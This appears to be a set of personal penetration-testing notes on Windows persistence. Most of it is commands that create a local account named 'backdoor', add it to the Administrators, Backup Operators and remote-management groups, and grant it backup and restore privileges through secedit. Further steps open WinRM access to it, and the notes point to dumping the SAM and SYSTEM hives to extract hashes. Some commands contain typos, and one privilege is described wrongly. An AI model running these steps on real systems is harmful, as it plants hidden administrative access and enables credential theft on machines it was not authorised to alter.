### Adding users to privileged groups
```powershell
# Creating user
net user backdoor /add

# Adding user to the administrators group
net localgroup "administrators" backdoor /add

# Adding user to "Backup Operators" group
net localgroup "Backup Operators" backdoor /add

# Adding user to "Remote Management Users" for RDP
net localroup "Remote Management users" backdoor /add
```

- By default, the UAC strips the remote user of it's administrative privs, this can be disabled. [[Policies#LocalAccountTokenFilterPolicy]]
- As a member of "Backup Operators", we can now save system and sam hives from the regsitery and use Impacket to get the system hash. [[Impacket#secretsdump.py]]

### Assigning privileges to users.
- By default, the 'backup Operators' have two privileges:
	- SeBackupPrivilege: User can read write any file in the system, ignoring any DACL in place
	- SeRestorePrivilege: User can read read any file in the system, ignoring any DACL in place
- A user can be assigned these privileges using `secedit` command.
```powershell
# Export current configuration
secedit /export /cfg config.inf

# Edit the config.inf to add the username in front of the privielge
SeBackupPrivilege = *S-1-5-32-544,*S-1-5-32-551,backdoor
SeRestorePrivilege = *S-1-5-32-544,*S-1-5-32-551,backdoor

# convert the config.inf file to config.sdb
secedit /import /cfg config.inf /db config.sdb
secedit /configure /db config.sdb /cnf /config.inf
```

### Enable win-rm without adding user to "Remote Management Users"
- Add the user to the security descriptor of Win-RM.
```powershell
# this will launch the configuration windows for the Win-RM's security descriptor
Set-PSSessionconfiguration -Name Microsoft.Powershell -showSecurityDescriptorUI
```
